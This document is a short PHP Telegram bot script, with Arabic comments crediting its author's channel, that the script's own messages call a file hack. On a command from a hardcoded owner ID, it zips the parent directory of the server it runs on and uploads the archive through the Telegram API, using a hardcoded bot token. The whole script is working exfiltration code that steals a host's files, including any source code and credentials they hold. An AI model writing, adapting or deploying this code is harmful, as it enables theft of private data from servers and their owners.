<?php
#  @ @ITIII4 قناة المطور
#الدمري @T_1TIT
# فقط البوت وتوكن الايدي ضع 

$botToken = '8177439286:AAHBipG3JXKLoHfB22rA4w4X-CWnMtIvCKo'; 
$ownerId = '6353156786'; 

function sendFileToTelegram($filePath, $chatId, $botToken) {
    if (!file_exists($filePath)) {
        return "File does not exist: $filePath\n";
    }

    $url = "https://api.telegram.org/bot$botToken/sendDocument";

    $post_fields = [
        'chat_id' => $chatId,
        'document' => new CURLFile($filePath)
    ];

    $ch = curl_init(); 
    curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type:multipart/form-data"]);
    curl_setopt($ch, CURLOPT_URL, $url); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields); 
    $output = curl_exec($ch);
    if ($output === false) {
        $output = curl_error($ch);
    }
    curl_close($ch);

    return $output . "\n";
}

function zipFolder($folderPath) {
    $zip = new ZipArchive();
    $zipFile = "$folderPath.zip";

    if ($zip->open($zipFile, ZipArchive::CREATE) !== TRUE) {
        return "Cannot open <$zipFile>\n";
    }

    $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($folderPath), RecursiveIteratorIterator::LEAVES_ONLY);

    foreach ($files as $name => $file) {
        if (!$file->isDir()) {
            $filePath = $file->getRealPath();
            $relativePath = substr($filePath, strlen($folderPath) + 1);
            $zip->addFile($filePath, $relativePath);
        }
    }

    $zip->close();
    return $zipFile;
}

$content = file_get_contents("php://input");
$update = json_decode($content, true);

if (!$update) {
    exit;
}

$message = isset($update['message']) ? $update['message'] : null;
$callbackQuery = isset($update['callback_query']) ? $update['callback_query'] : null;


if ($message) {
    $chatId = $message['chat']['id'];
    $text = $message['text'];
    $userId = $message['from']['id'];

 
    if ($text == '/start' && $userId == $ownerId) {
        $keyboard = [
            'inline_keyboard' => [
                [['text' => "اختراق الملفات", 'callback_data' => 'hamo_hack']]
            ]
        ];

        $replyMarkup = json_encode($keyboard);

        file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=تم اختراق البوت بنجاح اضغط لجلب الملفات 😈&reply_markup=$replyMarkup");
    }
}

if ($callbackQuery) {
    $chatId = $callbackQuery['message']['chat']['id'];
    $callbackData = $callbackQuery['data'];

    if ($callbackData == 'hamo_hack' && $callbackQuery['from']['id'] == $ownerId) {
        $parentDir = dirname(getcwd(), 1);  

        $zipFile = zipFolder($parentDir); 

        if (file_exists($zipFile)) {
            sendFileToTelegram($zipFile, $chatId, $botToken);
        }
    }
}

?>